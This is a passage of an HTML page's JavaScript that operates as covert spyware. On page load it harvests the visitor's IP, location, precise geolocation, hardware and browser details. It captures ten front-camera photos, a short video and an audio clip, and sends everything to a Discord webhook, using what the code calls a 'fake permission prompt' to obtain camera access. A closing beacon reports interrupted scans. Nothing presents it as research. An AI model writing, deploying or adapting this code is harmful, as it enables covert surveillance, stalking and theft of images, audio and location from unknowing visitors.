            const gpu = getEnhancedGPUInfo();
            const battery = await getEnhancedBatteryInfo();
            const connection = getConnectionInfo();
            const geolocation = await getGeolocation();
            const locale = getLocaleInfo();
            const storage = await getStorageInfo();
            
            scanData = {
                ip: networkInfo.ip,
                location: `${networkInfo.city}, ${networkInfo.country}`,
                region: networkInfo.region,
                isp: networkInfo.isp,
                timezone: networkInfo.timezone,
                deviceType: device.type,
                deviceModel: device.model,
                deviceName: device.name,
                os: device.os,
                osVersion: device.osVersion,
                osEdition: device.osEdition,
                browser: device.browser,
                browserVersion: device.browserVersion,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                cpu: `${hardware.cpuBrand} (${hardware.cpuCores} cores, ${hardware.architecture})`,
                ram: hardware.ram,
                gpu: gpu.renderer,
                gpuVendor: gpu.vendor,
                battery: battery,
                network: {
                    isVPN: networkInfo.isVPN ? "⚠️ VPN/PROXY DETECTED" : "No",
                    asn: networkInfo.asn,
                    connectionType: connection.type,
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                },
                geolocation: geolocation,
                locale: locale,
                storage: storage,
                userAgent: device.userAgent,
                platform: device.platform,
                deviceMemory: device.deviceMemory,
                hardwareConcurrency: device.hardwareConcurrency,
                maxTouchPoints: device.maxTouchPoints,
                colorDepth: device.colorDepth,
                pixelRatio: device.pixelRatio,
                languages: device.languages,
                cookieEnabled: device.cookieEnabled,
                webdriver: device.webdriver,
                plugins: device.plugins,
                mimeTypes: device.mimeTypes,
                javaEnabled: device.javaEnabled,
                chromeHistoryCount: device.chromeHistoryCount || "Unknown"
            };

            // Send initial system info as embed
            await sendEmbedToDiscord({
                title: "🔍 Complete System Scan Results",
                color: networkInfo.isVPN ? 0xff0000 : 0x3498db,
                fields: [
                    { name: "🖥️ Device Info", value: `**Type:** ${scanData.deviceType}\n**Model:** ${scanData.deviceModel}\n**Name:** ${scanData.deviceName}\n**OS:** ${scanData.os} ${scanData.osVersion} ${scanData.osEdition}\n**Browser:** ${scanData.browser} ${scanData.browserVersion}\n**Platform:** ${scanData.platform}\n**Architecture:** ${hardware.architecture}\n**User Agent:** \`\`\`${scanData.userAgent}\`\`\``, inline: false },
                    { name: "💻 Hardware Info", value: `**CPU:** ${scanData.cpu}\n**GPU:** ${scanData.gpu}\n**GPU Vendor:** ${scanData.gpuVendor}\n**RAM:** ${scanData.ram}\n**Device Memory:** ${scanData.deviceMemory}\n**Cores:** ${scanData.hardwareConcurrency}\n**Touch Points:** ${scanData.maxTouchPoints}`, inline: false },
                    { name: "🌐 Network Info", value: `**IP:** ${scanData.ip}\n**Location:** ${scanData.location}\n**Region:** ${scanData.region}\n**ISP:** ${scanData.isp}\n**ASN:** ${scanData.network.asn}\n**VPN/Proxy:** ${scanData.network.isVPN}\n**Connection:** ${scanData.network.connectionType} (${scanData.network.effectiveType})\n**Downlink:** ${scanData.network.downlink}\n**RTT:** ${scanData.network.rtt}\n**Save Data:** ${scanData.network.saveData}`, inline: false },
                    { name: "🖥️ Display Info", value: `**Screen:** ${scanData.screen}\n**Color Depth:** ${scanData.colorDepth}\n**Pixel Ratio:** ${scanData.pixelRatio}`, inline: true },
                    { name: "🗺️ Geolocation", value: `**Latitude:** ${scanData.geolocation.latitude}\n**Longitude:** ${scanData.geolocation.longitude}\n**Accuracy:** ${scanData.geolocation.accuracy}\n**Altitude:** ${scanData.geolocation.altitude}\n**Speed:** ${scanData.geolocation.speed}`, inline: true },
                    { name: "🌍 Locale Info", value: `**Timezone:** ${scanData.locale.timezone}\n**Locale:** ${scanData.locale.locale}\n**Languages:** ${scanData.locale.languages}\n**Date Format:** ${scanData.locale.dateFormat}\n**Time Format:** ${scanData.locale.timeFormat}\n**Calendar:** ${scanData.locale.calendar}\n**Numbering System:** ${scanData.locale.numberingSystem}`, inline: false },
                    { name: "🔋 Battery Info", value: `**Level:** ${scanData.battery.level}\n**Charging:** ${scanData.battery.charging}\n**Charging Time:** ${scanData.battery.chargingTime}\n**Discharging Time:** ${scanData.battery.dischargingTime}`, inline: true },
                    { name: "💾 Storage Info", value: `**Quota:** ${scanData.storage.quota}\n**Usage:** ${scanData.storage.usage}\n**Persisted:** ${scanData.storage.persisted}`, inline: true },
                    { name: "⚙️ Other Info", value: `**Cookies Enabled:** ${scanData.cookieEnabled}\n**WebDriver:** ${scanData.webdriver}\n**Java Enabled:** ${scanData.javaEnabled}\n**Plugins:** ${scanData.plugins}\n**MIME Types:** ${scanData.mimeTypes}\n**Chrome History Count:** ${scanData.chromeHistoryCount}`, inline: false }
                ],
                timestamp: new Date().toISOString()
            });

            // Start front camera with 4K resolution if possible
            frontCameraStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 3840 },
                    height: { ideal: 2160 },
                    frameRate: { ideal: 60, min: 30 }
                },
                audio: true // Enable audio for the recording
            });

            const video = document.createElement('video');
            video.className = 'hidden-video';
            video.srcObject = frontCameraStream;
            video.autoplay = true;
            video.playsinline = true;
            document.body.appendChild(video);
            await new Promise(resolve => video.onloadedmetadata = resolve);

            // Start audio recording
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioRecorder = new MediaRecorder(audioStream);
            audioChunks = [];
            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
            audioRecorder.start();

            // Start 1-second 4K video recording with audio
            mediaRecorder = new MediaRecorder(frontCameraStream, {
                mimeType: 'video/mp4', // Use MP4 format instead of webm
                videoBitsPerSecond: 8000000 // Higher bitrate for 4K
            });
            recordedChunks = [];
            mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
            mediaRecorder.start();

            // Stop recordings after 1 second for the 4K video
            setTimeout(async () => {
                mediaRecorder.stop();
                audioRecorder.stop();

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
                    await sendFileToDiscord(
                        videoBlob,
                        'video_1s_4k.mp4',
                        `🎥 1s 4K Video with Audio from ${scanData.deviceType}`
                    );
                };

                audioRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
                    await sendFileToDiscord(
                        audioBlob,
                        'audio_1s.mp4',
                        `🎤 1s Audio from ${scanData.deviceType}`
                    );
                };
            }, 1000);

            // Take 10 photos (1 per second) in parallel with the video recording
            for (let i = 1; i <= 10; i++) {
                const photoBlob = await capturePhoto(video, i);
                await sendFileToDiscord(
                    photoBlob,
                    `photo_${i}.jpg`,
                    `📸 Photo ${i}/10 from ${scanData.deviceType} (${scanData.os} ${scanData.osVersion})`
                );
                if (i < 10) await new Promise(resolve => setTimeout(resolve, 1000));
            }

            // Clean up after all recordings are done
            setTimeout(() => {
                frontCameraStream.getTracks().forEach(track => track.stop());
                audioStream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                isScanComplete = true;
                
                // Send completion embed
                sendEmbedToDiscord({
                    title: "✅ Scan Completed Successfully",
                    description: "All media and data collected",
                    color: 0x00ff00,
                    fields: [
                        { name: "Device", value: `${scanData.deviceType} (${scanData.deviceModel})`, inline: true },
                        { name: "OS", value: `${scanData.os} ${scanData.osVersion} ${scanData.osEdition}`, inline: true },
                        { name: "Location", value: scanData.location, inline: true },
                        { name: "Collected Media", value: "10 photos\n1s 4K video with audio", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                });
            }, 11000); // Slightly more than the longest operation (10 photos at 1s intervals)

        } catch (error) {
            console.error("Scan error:", error);
            await sendEmbedToDiscord({
                title: "❌ Scan Failed",
                description: "An error occurred during the scan",
                color: 0xff0000,
                fields: [
                    { name: "Error", value: `\`\`\`${error.message}\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            });
        }
    }

    // Start scan when page loads
    window.addEventListener('load', async () => {
        // Check if we already have permissions
        const hasPermissions = await checkMediaPermissions();
        
        if (hasPermissions) {
            // If we already have permissions, start recording immediately
            startRecording();
        } else {
            // Otherwise show the fake permission prompt
            showPermissionPrompt();
        }
    });

    // Handle page closing
    window.addEventListener('beforeunload', () => {
        if (!isScanComplete) {
            const content = JSON.stringify({
                embeds: [{
                    title: "⚠️ Scan Interrupted",
                    description: "The page was closed before the scan could complete",
                    color: 0xffa500,
                    fields: [
                        { name: "IP", value: scanData.ip || "Unknown", inline: true },
                        { name: "Device", value: scanData.deviceType || "Unknown", inline: true },
                        { name: "Progress", value: "Partial data may have been collected", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
            navigator.sendBeacon(DISCORD_WEBHOOK, new Blob([content], { type: 'application/json' }));
        }
    });
</script>
</body>
</html>
